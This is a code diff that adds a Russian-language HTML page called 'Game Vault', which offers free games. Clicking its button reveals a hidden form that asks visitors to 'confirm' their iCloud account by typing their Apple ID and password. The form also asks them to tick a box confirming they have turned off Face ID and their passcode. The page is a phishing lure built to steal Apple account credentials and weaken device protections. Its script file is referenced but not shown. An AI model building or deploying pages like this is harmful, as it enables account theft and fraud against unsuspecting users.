@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Game Vault - бесплатные игры</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+    <!-- Основной контент -->
+    <div id="mainContent">
+        <!-- ... -->
+        <button id="getGamesBtn" class="cta-button">🎮 Получить бесплатные игры</button>
+    </div>
+
+    <!-- Форма (скрыта изначально) -->
+    <div id="formContainer" style="display: none;">
+        <h2>Подтвердите учётную запись iCloud</h2>
+        <p class="info">Автоматическая покупка игр требует подтверждения.</p>
+        <input type="email" id="appleId" placeholder="Apple ID / email" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <div class="helper">
+            <a href="#" id="whyLink">Зачем это?</a>
+            <div id="whyText" style="display: none;">Софт автоматически покупает...</div>
+        </div>
+        <label>
+            <input type="checkbox" id="faceIdOff"> Я отключил Face ID и код-пароль
+        </label>
+        <button id="submitBtn">Активировать игры</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
